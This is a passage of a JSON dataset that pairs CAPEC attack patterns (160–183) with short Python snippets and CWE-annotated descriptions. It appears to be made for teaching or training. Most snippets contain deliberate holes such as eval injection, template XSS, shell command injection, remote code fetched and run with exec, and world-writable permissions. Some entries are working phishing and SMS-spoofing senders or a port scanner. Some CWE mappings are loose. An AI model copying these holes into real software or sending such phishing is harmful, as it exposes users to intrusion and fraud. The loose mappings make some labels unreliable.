        "code_snippet": "import os\nimport ctypes\n\n# CWE-426: Untrusted Search Path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-73: External Control of File Name or Path\n\n# Simulate user input for library path\nuser_supplied_path = input('Enter the path to the library: ')\n\n# CWE-706: Use of Incorrectly-Resolved Name or Reference\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n\n# Attempt to load a library from the user-supplied path\ntry:\n    # This could be a malicious library if the path is controlled by an attacker\n    lib = ctypes.CDLL(os.path.join(user_supplied_path, 'malicious_lib.so'))\n    print('Library loaded successfully')\n    # Call a function from the loaded library\n    lib.malicious_function()\nexcept Exception as e:\n    print(f'Failed to load library: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability where an application loads an external library based on a user-supplied path. The code uses the `ctypes` library to load a shared library (`malicious_lib.so`) from a path provided by the user. This embodies the CAPEC 'Redirect Access to Libraries' by allowing an attacker to supply a path to a malicious library, which the application then loads and executes. The related CWEs are represented as follows: CWE-426 and CWE-427 highlight the dangers of using untrusted and uncontrolled search paths, CWE-73 shows the risk of external control over file paths, CWE-706 involves the incorrect resolution of names or references, and CWE-1265 touches on the potential for unintended reentrant invocation. This code snippet is vulnerable because it does not validate or sanitize the user input, allowing an attacker to redirect the library loading process to a malicious library."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/execute', methods=['POST'])\ndef execute_script():\n    script = request.form['script']\n    # Vulnerable to script injection\n    return render_template_string('<html><body><script>{{ script }}</script></body></html>', script=script)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to script injection attacks. The '/execute' endpoint accepts a POST request containing a 'script' parameter. The script is then directly embedded into an HTML template using Flask's render_template_string function without proper neutralization. This can lead to Cross-Site Scripting (XSS) attacks, where an attacker can inject malicious scripts. The code embodies the main idea of the CAPEC 'Exploit Script-Based APIs' by showing how an attacker can exploit a web application's ability to execute scripts provided by the user. The related CWEs are represented by the lack of input validation and improper neutralization of user input, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import socket\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef vulnerable_client(server_ip, server_port):\n    try:\n        # Create a socket object\n        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # CWE-941: Incorrectly specified destination (attacker's IP instead of legitimate server)\n        client_socket.connect((server_ip, server_port))\n        \n        # CWE-924: No integrity check on the message\n        message = \"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\"\n        client_socket.sendall(message.encode('utf-8'))\n        \n        # Receive data from the server\n        response = client_socket.recv(4096)\n        \n        # CWE-497: Exposure of sensitive system information\n        print(\"Received response:\", response.decode('utf-8'))\n        \n    except Exception as e:\n        print(\"An error occurred:\", e)\n    finally:\n        client_socket.close()\n\n# CWE-923: Improper restriction of communication channel to intended endpoints\n# Attacker's IP address instead of the legitimate server's IP\nvulnerable_client('192.168.1.100', 80)",
        "description": "This Python code snippet demonstrates a vulnerable client that connects to a server. The vulnerabilities are as follows:\n\n1. **CWE-923**: The client does not ensure it is communicating with the correct endpoint, allowing an attacker to intercept the communication.\n2. **CWE-941**: The client connects to an incorrect destination (attacker's IP) instead of the legitimate server.\n3. **CWE-924**: The client sends a message without ensuring its integrity, making it susceptible to tampering during transmission.\n4. **CWE-497**: The client prints the received response, potentially exposing sensitive system information to unauthorized entities.\n\nThis code embodies the main idea of the CAPEC by demonstrating how an attacker can manipulate the infrastructure to redirect communication to a malicious server, potentially gathering sensitive information or altering the communication flow."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/purchase', methods=['GET', 'POST'])\ndef purchase():\n    if request.method == 'POST':\n        # Vulnerable: Trusting client-side hidden field for price\n        item_price = request.form['price']\n        quantity = request.form['quantity']\n        total_cost = float(item_price) * int(quantity)\n        return f'Total cost: ${total_cost}'\n    return render_template_string('''\n        <form method=\"post\">\n            <input type=\"hidden\" name=\"price\" value=\"100\">\n            Quantity: <input type=\"text\" name=\"quantity\" value=\"1\">\n            <input type=\"submit\" value=\"Buy\">\n        </form>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has a purchase endpoint that processes a form submission. The form includes a hidden field for the item price, which is trusted by the server when calculating the total cost. An attacker can manipulate the hidden price field in the form to reduce the cost of the item, exploiting the server's reliance on client-side data. This example embodies the CAPEC 'Manipulating Hidden Fields' and highlights related CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602) and 'External Control of Assumed-Immutable Web Parameter' (CWE-472)."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\n# CWE-601: URL Redirection to Untrusted Site\nphishing_url = 'http://malicious-site.com/login'\n\n# CWE-451: UI Misrepresentation of Critical Information\nemail_body = f\"\"\"\nDear User,\n\nWe noticed unusual activity in your account. Please verify your account by clicking the link below:\n\n<a href='{phishing_url}'>Verify Account</a>\n\nThank you,\nTrusted Entity\n\"\"\"\n\n# CWE-1022: Use of Web Link to Untrusted Target with window.opener Access\nemail_body += \"<script>window.opener.location='http://malicious-site.com';</script>\"\n\n# Email setup\nsender_email = \"trusted_entity@example.com\"\nreceiver_email = \"target_user@example.com\"\nmsg = MIMEMultipart()\nmsg['From'] = sender_email\nmsg['To'] = receiver_email\nmsg['Subject'] = 'Account Verification Required'\nmsg.attach(MIMEText(email_body, 'html'))\n\n# Sending the email\ntry:\n    with smtplib.SMTP('smtp.example.com', 587) as server:\n        server.starttls()\n        server.login(sender_email, 'password')\n        server.sendmail(sender_email, receiver_email, msg.as_string())\n        print('Phishing email sent successfully')\nexcept Exception as e:\n    print(f'Failed to send email: {e}')",
        "description": "This Python code snippet demonstrates a spear phishing attack by sending a targeted email to a specific user. The email appears to come from a trusted entity and contains a link to a malicious site (CWE-601). The email body misrepresents critical information to deceive the user (CWE-451). Additionally, it includes a script that exploits the window.opener property to redirect the user's browser to a malicious site (CWE-1022). The code uses the smtplib library to send the email, mimicking a legitimate email from a trusted source."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-451: UI Misrepresentation of Critical Information\nphishing_message = \"Your account has been compromised. Please visit http://fakebank.com to secure your account.\"\n\n# CWE-290: Authentication Bypass by Spoofing\nspoofed_sender = \"security@realbank.com\"\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-308: Use of Single-factor Authentication\n\n# Function to send phishing SMS via email-to-SMS gateway\ndef send_phishing_sms(phone_number):\n    msg = MIMEText(phishing_message)\n    msg['From'] = spoofed_sender\n    msg['To'] = f\"{phone_number}@sms.gateway.com\"\n    msg['Subject'] = \"Urgent: Account Security Alert\"\n\n    try:\n        with smtplib.SMTP('smtp.fakeemail.com') as server:\n            server.sendmail(spoofed_sender, [msg['To']], msg.as_string())\n        print(f\"Phishing SMS sent to {phone_number}\")\n    except Exception as e:\n        print(f\"Failed to send phishing SMS: {e}\")\n\n# Example usage\nsend_phishing_sms(\"1234567890\")",
        "description": "This Python code snippet demonstrates a mobile phishing attack by sending a phishing SMS message via an email-to-SMS gateway. The message falsely claims that the user's account has been compromised and directs them to a fake website to 'secure' their account. The sender's email is spoofed to appear as if it is from a legitimate source (CWE-290). The message misrepresents critical information (CWE-451) to deceive the user. The code does not implement measures to prevent excessive authentication attempts (CWE-307) and relies on single-factor authentication (CWE-308) and password systems (CWE-309), making it easier for attackers to exploit these weaknesses."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    # CWE-22: Path Traversal\n    if not file_path.startswith('/safe/directory/'): \n        raise ValueError('Invalid file path')\n\n    # CWE-73: External Control of File Name or Path\n    with open(file_path, 'r') as file:\n        content = file.read()\n\n    # CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n    if file_path.endswith('.txt'):\n        process_as_text(content)\n    elif file_path.endswith('.jpg'):\n        process_as_image(content)\n    else:\n        raise ValueError('Unsupported file type')\n\n    # CWE-377: Insecure Temporary File\n    temp_file_path = '/tmp/tempfile'\n    with open(temp_file_path, 'w') as temp_file:\n        temp_file.write(content)\n\n    # CWE-99: Improper Control of Resource Identifiers\n    os.system(f'cat {temp_file_path}')\n\n\ndef process_as_text(content):\n    print('Processing text file')\n\n\ndef process_as_image(content):\n    print('Processing image file')\n\n# Example usage\nuser_input_path = input('Enter the file path: ')\nprocess_file(user_input_path)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to file manipulation as described in the CAPEC. The function `process_file` takes a file path as input and performs various operations on the file. It checks if the file path starts with a safe directory to prevent path traversal (CWE-22). It then opens the file based on the user-provided path, which can be influenced externally (CWE-73). The file type is determined by its extension, which can be manipulated by an attacker to cause incorrect processing (CWE-646). The content is written to an insecure temporary file (CWE-377), and finally, the content of the temporary file is displayed using a system command, which can lead to command injection (CWE-99). This code snippet embodies the main idea of file manipulation attacks by demonstrating how improper handling of file paths, names, and contents can lead to various security vulnerabilities."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "class SystemConfig:\n    def __init__(self):\n        self.config = {'setting1': 'default1', 'setting2': 'default2'}\n        self.authenticated = False\n\n    def reset_config(self):\n        if not self.authenticated:\n            self.config = {'setting1': 'default1', 'setting2': 'default2'}\n            print('Configuration reset to default values.')\n        else:\n            print('Unauthorized reset attempt.')\n\n    def authenticate(self, password):\n        if password == 'correct_password':\n            self.authenticated = True\n            print('Authenticated successfully.')\n        else:\n            print('Authentication failed.')\n\n# Example usage\nsystem = SystemConfig()\nsystem.reset_config()  # Resets configuration without authentication\nsystem.authenticate('correct_password')\nsystem.reset_config()  # Prevents reset after authentication",
        "description": "This Python code snippet defines a `SystemConfig` class that simulates a system configuration with a reset function. The `reset_config` method resets the configuration to default values if the user is not authenticated, demonstrating a lack of authentication for a critical function (CWE-306). The `authenticate` method simulates user authentication. The code highlights the vulnerability where an attacker can reset the system configuration to default values without proper authentication, embodying the main idea of the CAPEC 'Force the System to Reset Values'."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import os\nimport logging\n\n# CWE-1323: Improper Management of Sensitive Trace Data\nTRACE_FILE = '/tmp/trace.log'\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nlogging.basicConfig(filename=TRACE_FILE, level=logging.DEBUG)\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Simulating a security-critical function that might be optimized away\nsecurity_critical = True\nif security_critical:\n    logging.debug('Security-critical operation executed')\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Simulating debug mode activation\nDEBUG_MODE = True\nif DEBUG_MODE:\n    logging.debug('Debug mode activated')\n\n# CWE-506: Embedded Malicious Code\n# Simulating malicious behavior\nif os.path.exists(TRACE_FILE):\n    with open(TRACE_FILE, 'r') as file:\n        data = file.read()\n        # Maliciously exfiltrate sensitive trace data\n        print('Exfiltrating data:', data)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to white box reverse engineering. It logs sensitive trace data to an unprotected file (CWE-1323), which can be accessed by unauthorized users (CWE-497). The code includes a security-critical operation that might be optimized away by the processor (CWE-1037). It also simulates the activation of debug mode at runtime (CWE-1313), which can alter the system's behavior. Finally, it contains a malicious code segment that reads and exfiltrates the sensitive trace data (CWE-506). This snippet embodies the main idea of white box reverse engineering by exposing the internal workings and vulnerabilities of the software."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "import os\n\n# Create a file with an alternate data stream\nfile_path = 'example.txt'\nads_path = f'{file_path}:hidden_stream'\n\n# Write data to the main file\nwith open(file_path, 'w') as f:\n    f.write('This is the main file content.')\n\n# Write data to the alternate data stream\nwith open(ads_path, 'w') as f:\n    f.write('This is hidden content in ADS.')\n\n# Read data from the main file\nwith open(file_path, 'r') as f:\n    print('Main file content:', f.read())\n\n# Attempt to read data from the alternate data stream\ntry:\n    with open(ads_path, 'r') as f:\n        print('ADS content:', f.read())\nexcept FileNotFoundError:\n    print('ADS not found.')",
        "description": "This Python code snippet demonstrates the creation and usage of an Alternate Data Stream (ADS) in a Windows NTFS file system. The main file 'example.txt' is created and written with some content. An ADS named 'hidden_stream' is then created and written with hidden content. The code attempts to read and print the content of both the main file and the ADS. This example embodies the CAPEC concept by showing how an attacker could use ADS to hide data within a file, making it invisible to standard file listing utilities. The related CWEs are represented by the improper handling and detection of ADS, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import socket\n\n# Function to perform footprinting by probing open ports\ndef footprinting(target_ip):\n    open_ports = []\n    for port in range(1, 1025):  # Scanning first 1024 ports\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target_ip, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\n# Function to simulate exposure of sensitive information\ndef expose_sensitive_info():\n    sensitive_info = 'Database Password: secret123'\n    print(sensitive_info)  # CWE-200: Exposing sensitive information\n\n# Function to simulate observable behavioral discrepancy\ndef observable_discrepancy():\n    if 'Linux' in socket.gethostname():\n        print('Running on Linux')  # CWE-205: Observable behavioral discrepancy\n    else:\n        print('Running on another OS')\n\n# Main function\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    open_ports = footprinting(target_ip)\n    print(f'Open ports on {target_ip}: {open_ports}')\n    expose_sensitive_info()\n    observable_discrepancy()",
        "description": "This Python code snippet demonstrates the concept of footprinting by probing open ports on a target IP address. The 'footprinting' function scans the first 1024 ports to identify which ones are open. The 'expose_sensitive_info' function simulates the exposure of sensitive information (CWE-200) by printing a hardcoded password. The 'observable_discrepancy' function demonstrates an observable behavioral discrepancy (CWE-205) by printing different messages based on the operating system. This code embodies the main idea of CAPEC-170 (Footprinting) by showing how an adversary might gather information about a target system and highlights related weaknesses that could be exploited."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "import requests\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nurl = 'http://example.com/login?username=admin&password=secret'\nresponse = requests.get(url)\n\n# CWE-209: Generation of Error Message Containing Sensitive Information\nif response.status_code != 200:\n    print(f'Error: {response.status_code} - {response.text}')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nserver_info = response.headers.get('Server')\nif server_info:\n    print(f'Server Information: {server_info}')\n\n# CWE-1125: Excessive Attack Surface\n# The application exposes multiple endpoints that can be probed\nendpoints = ['/admin', '/config', '/debug']\nfor endpoint in endpoints:\n    full_url = f'http://example.com{endpoint}'\n    resp = requests.get(full_url)\n    print(f'Endpoint {endpoint} response: {resp.status_code}')",
        "description": "This Python code snippet demonstrates a web application fingerprinting attack by sending HTTP GET requests to a target web application. It includes sensitive information in the query string (CWE-598), handles error messages that may contain sensitive information (CWE-209), and extracts server information from response headers (CWE-497). Additionally, it probes multiple endpoints to illustrate an excessive attack surface (CWE-1125). The code aims to gather version-dependent and type-dependent behavior of the web application, which can be used to formulate targeted attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "user_input = input('Enter variable name: ')\n\n# CWE-627: Dynamic Variable Evaluation\ntry:\n    exec(f'{user_input} = 42')\n    print(f'Variable {user_input} set to 42')\nexcept Exception as e:\n    print(f'Error: {e}')\n\n# CWE-95: Eval Injection\ntry:\n    result = eval(user_input)\n    print(f'Result of eval: {result}')\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates vulnerabilities related to CAPEC-77: Manipulating User-Controlled Variables. The code allows a user to input a variable name, which is then dynamically evaluated and assigned a value using `exec`. This represents CWE-627 (Dynamic Variable Evaluation) as it allows the user to influence variable names at runtime. Additionally, the code uses `eval` to evaluate the user input, which can lead to CWE-95 (Eval Injection) if the input is not properly sanitized. This code is vulnerable because it allows arbitrary code execution through user input, highlighting the risks of improper control of dynamically-identified variables and dynamically-managed code resources."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['GET', 'POST'])\ndef submit():\n    if request.method == 'POST':\n        # CWE-451: UI Misrepresentation of Critical Information\n        # The user thinks they are submitting a query, but they are actually downloading a file\n        return app.send_static_file('malicious_software.exe')\n    return render_template_string('''\n        <form method=\"post\">\n            <button type=\"submit\">Submit Query</button>\n        </form>\n    ''')\n\n@app.route('/broadcast', methods=['POST'])\ndef broadcast():\n    # CWE-925: Improper Verification of Intent by Broadcast Receiver\n    # The application does not verify the source of the intent\n    intent_data = request.form.get('data')\n    if intent_data:\n        # Process the intent data without verification\n        return 'Intent received and processed'\n    return 'No intent data received'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that embodies the concept of Action Spoofing (CAPEC). The '/submit' route misleads the user into thinking they are submitting a query, but it actually triggers a file download (CWE-451: UI Misrepresentation of Critical Information). The '/broadcast' route simulates an Android Broadcast Receiver that processes intents without verifying their source (CWE-925: Improper Verification of Intent by Broadcast Receiver). This code highlights how an adversary can disguise actions and exploit improper verification to perform unintended actions."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/flash', methods=['GET'])\ndef flash_injection():\n    # CWE-434: Unrestricted Upload of File with Dangerous Type\n    flash_file = request.args.get('flash_file')\n    if not flash_file.endswith('.swf'):\n        return 'Invalid file type', 400\n\n    # CWE-88: Improper Neutralization of Argument Delimiters in a Command\n    # CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n    flash_params = request.args.get('params')\n    template = f\"<embed src='{flash_file}' {flash_params}></embed>\"\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has an endpoint '/flash' that accepts user input to embed a Flash file within an HTML document. The code is vulnerable to Flash Parameter Injection (CAPEC) due to improper data validation and neutralization. Specifically, it allows unrestricted upload of files (CWE-434) and does not properly neutralize argument delimiters (CWE-88) or special elements in a template engine (CWE-1336). An attacker can exploit these weaknesses to inject malicious parameters into the Flash file, potentially compromising the embedding HTML document."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import requests\n\n# Vulnerable function that includes code from an external source\ndef include_code(url):\n    try:\n        # Fetch the code from the given URL\n        response = requests.get(url)\n        response.raise_for_status()\n        # Execute the fetched code\n        exec(response.text)\n    except requests.RequestException as e:\n        print(f\"Failed to fetch code: {e}\")\n\n# Example usage\ninclude_code('http://example.com/malicious_code.py')",
        "description": "This Python code snippet demonstrates a vulnerability where code is included from an external source and executed. The function `include_code` takes a URL as input, fetches the code from that URL using the `requests` library, and then executes the fetched code using the `exec` function. This embodies the main idea of the CAPEC 'Code Inclusion' by showing how an adversary could exploit a weakness to force arbitrary code to be retrieved from a remote location and executed. The related CWEs are represented as follows:\n- CWE-829: The code imports executable functionality from an untrusted source (the URL).\n- CWE-506: The fetched code could be malicious in nature.\n- CWE-94: The code segment is constructed using externally-influenced input (the URL) without proper neutralization.\n- CWE-98: Although not PHP, the concept of remote file inclusion is similar.\n- CWE-913: The code does not properly restrict the execution of dynamically-managed code resources."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import os\n\n# Vulnerable configuration file path\nconfig_file_path = '/etc/myapp/config.ini'\n\n# Function to read configuration\ndef read_config(file_path):\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Function to write configuration\ndef write_config(file_path, data):\n    with open(file_path, 'w') as file:\n        file.write(data)\n\n# Simulate an attacker modifying the configuration file\nattacker_data = '[Settings]\\nDebugMode=True\\n'\nwrite_config(config_file_path, attacker_data)\n\n# Application reads the modified configuration\nconfig_data = read_config(config_file_path)\nprint('Configuration Loaded:', config_data)\n\n# Application behavior changes based on the modified configuration\nif 'DebugMode=True' in config_data:\n    print('Debug mode enabled, sensitive operations exposed!')",
        "description": "This Python code snippet demonstrates a configuration/environment manipulation attack. The code simulates an attacker modifying an external configuration file used by an application. The `write_config` function is used to write malicious data to the configuration file, enabling a debug mode that exposes sensitive operations. The application then reads the modified configuration using the `read_config` function and changes its behavior based on the manipulated settings. This example embodies the main idea of CAPEC-15, where an attacker externally controls system or configuration settings, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import os\n\n# Simulate a protected directory and file\nprotected_dir = '/protected'\nprotected_file = 'config.cfg'\n\n# Simulate an attacker creating a file with the same name in a different directory\nattacker_dir = '/tmp'\nattacker_file_path = os.path.join(attacker_dir, protected_file)\n\n# Create the attacker's file\nwith open(attacker_file_path, 'w') as f:\n    f.write('malicious content')\n\n# Simulate the application searching for the file\nsearch_paths = ['/tmp', '/protected']\n\n# Application loads the first file it finds\nfor path in search_paths:\n    file_path = os.path.join(path, protected_file)\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as f:\n            content = f.read()\n        print(f'Loaded content from {file_path}: {content}')\n        break",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can create a file with the same name as a protected file in a different directory. The application searches for the file in multiple directories and loads the first one it finds. In this case, the attacker's file in '/tmp' is found before the legitimate file in '/protected', leading to the application loading and potentially executing malicious content. This embodies the main idea of the CAPEC by exploiting file location algorithms and related CWEs such as 'Use of Incorrectly-Resolved Name or Reference' and 'External Control of File Name or Path'."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "from flask import Flask, request, redirect, make_response\n\napp = Flask(__name__)\n\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    if target_url:\n        return redirect(target_url)\n    return 'No URL provided', 400\n\n@app.route('/flash')\ndef flash_vulnerable():\n    flash_url = request.args.get('flash_url')\n    if flash_url:\n        response = make_response(f'<object type=\"application/x-shockwave-flash\" data=\"{flash_url}\"></object>')\n        response.headers['Content-Type'] = 'text/html'\n        return response\n    return 'No Flash URL provided', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a web application with two endpoints: '/redirect' and '/flash'. The '/redirect' endpoint demonstrates an open redirect vulnerability (CWE-601) by accepting a user-controlled 'url' parameter and redirecting the user to that URL without validation. The '/flash' endpoint demonstrates a Cross-Site Flashing vulnerability by accepting a user-controlled 'flash_url' parameter and embedding it in an HTML object tag, which can load and execute a Flash file from an external URL. This can be exploited if the Flash file contains malicious instructions. The code highlights the risks of allowing user-controlled input to dictate URLs and the embedding of external content without proper validation."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "from flask import Flask, request, jsonify, make_response\nimport os\n\napp = Flask(__name__)\n\n# CWE-219: Sensitive data stored under web root\n@app.route('/config', methods=['GET'])\ndef get_config():\n    with open('config.json', 'r') as file:\n        data = file.read()\n    return data\n\n# CWE-598: Using GET request with sensitive query strings\n@app.route('/user', methods=['GET'])\ndef get_user():\n    user_id = request.args.get('id')\n    return jsonify({'user_id': user_id, 'name': 'John Doe'})\n\n# CWE-602: Client-side enforcement of server-side security\n@app.route('/admin', methods=['GET'])\ndef admin_panel():\n    if request.cookies.get('role') != 'admin':\n        return make_response('Access Denied', 403)\n    return 'Welcome to the admin panel'\n\n# CWE-539: Use of persistent cookies containing sensitive information\n@app.route('/login', methods=['POST'])\ndef login():\n    resp = make_response('Logged in')\n    resp.set_cookie('session_id', '123456789', max_age=60*60*24*30)  # Persistent cookie\n    return resp\n\n# CWE-433: Unparsed raw web content delivery\n@app.route('/raw', methods=['GET'])\ndef raw_content():\n    return open('raw_content.txt', 'r').read()\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask framework to create a web application that demonstrates several vulnerabilities related to the CAPEC 'Calling Micro-Services Directly'. The code includes:\n\n1. **CWE-219**: Sensitive data (config.json) is stored under the web root and served directly via the '/config' endpoint.\n2. **CWE-598**: Sensitive information (user ID) is passed in the query string of a GET request at the '/user' endpoint.\n3. **CWE-602**: Client-side enforcement of server-side security is demonstrated in the '/admin' endpoint, where access control is based on a cookie value.\n4. **CWE-539**: Persistent cookies containing sensitive information are set in the '/login' endpoint.\n5. **CWE-433**: Raw content is delivered unparsed via the '/raw' endpoint.\n\nThese vulnerabilities illustrate how an attacker could discover and exploit micro-services by gathering information about their implementation and function, leading to potential security breaches."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import os\n\n# Incorrectly configured access control\n# Sensitive directory path\nsensitive_path = '/etc/sensitive_data'\n\n# Incorrect permission assignment for critical resource (CWE-732)\nos.chmod(sensitive_path, 0o777)  # World-writable permissions\n\n# Function to read sensitive data\n# Insufficient granularity of access control (CWE-1220)\ndef read_sensitive_data(user):\n    if user in ['admin', 'user']:\n        with open(os.path.join(sensitive_path, 'data.txt'), 'r') as file:\n            return file.read()\n    else:\n        return 'Access Denied'\n\n# Example usage\nprint(read_sensitive_data('guest'))  # Unauthorized user can still access sensitive data",
        "description": "This Python code snippet demonstrates a scenario where an attacker can exploit incorrectly configured access control settings to gain unauthorized access to sensitive data. The code sets world-writable permissions on a sensitive directory (`/etc/sensitive_data`), which is an example of 'Incorrect Permission Assignment for Critical Resource' (CWE-732). The `read_sensitive_data` function attempts to implement access control but does so with insufficient granularity (CWE-1220), allowing unauthorized users (e.g., 'guest') to access sensitive data. This embodies the main idea of the CAPEC, where an attacker exploits weaknesses in access control configuration to bypass protections and gain unauthorized access."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    if file:\n        file.save(f'/uploads/{file.filename}')\n        return 'File uploaded successfully'\n    return 'No file uploaded'\n\n@app.route('/')\ndef index():\n    return render_template_string('''\n    <html>\n    <body>\n        <form action=\"/upload\" method=\"post\" enctype=\"multipart/form-data\">\n            <input type=\"file\" name=\"file\">\n            <input type=\"submit\" value=\"Upload\">\n        </form>\n        <div style=\"position:relative;\">\n            <iframe src=\"http://example.com\" style=\"position:absolute; top:0; left:0; width:100%; height:100%; opacity:0;\"></iframe>\n            <button onclick=\"alert('Clicked!')\">Click Me!</button>\n        </div>\n    </body>\n    </html>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates a clickjacking attack using a transparent overlay. The '/upload' route allows for the unrestricted upload of files, which can be dangerous (CWE-434). The main page (index route) contains an HTML form for file uploads and a button that is overlaid by a transparent iframe. The iframe loads content from another domain (CWE-1021), and because it is transparent, user clicks on the button are intercepted by the iframe, demonstrating a clickjacking attack (CAPEC-103). This code also implicitly highlights the risk of permissive cross-domain policies (CWE-942) and potential XSS vulnerabilities (CWE-79) if user inputs are not properly sanitized."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/load_flash', methods=['GET'])\ndef load_flash():\n    flash_url = request.args.get('flash_url')\n    if not flash_url:\n        return 'No flash URL provided', 400\n    # CWE-20: Improper Input Validation\n    if 'http' not in flash_url:\n        return 'Invalid URL', 400\n    # CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n    response = requests.get(flash_url)\n    if response.status_code != 200:\n        return 'Failed to load flash content', 500\n    # CWE-506: Embedded Malicious Code\n    flash_content = response.text\n    # CWE-184: Incomplete List of Disallowed Inputs\n    if '<script>' in flash_content:\n        return 'Malicious content detected', 400\n    # CWE-697: Incorrect Comparison\n    if flash_content == 'safe':\n        return 'Safe content loaded', 200\n    return render_template_string(flash_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application that loads Flash content from a user-specified URL. The main idea of the CAPEC is demonstrated by allowing an attacker to trick the application into loading malicious Flash content. The code includes several CWE-related weaknesses: CWE-20 (Improper Input Validation) by not thoroughly validating the 'flash_url' parameter, CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) by fetching content from potentially untrusted domains, CWE-506 (Embedded Malicious Code) by potentially rendering malicious Flash content, CWE-184 (Incomplete List of Disallowed Inputs) by not thoroughly checking for all types of malicious content, and CWE-697 (Incorrect Comparison) by performing a simplistic and incorrect comparison of the Flash content."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
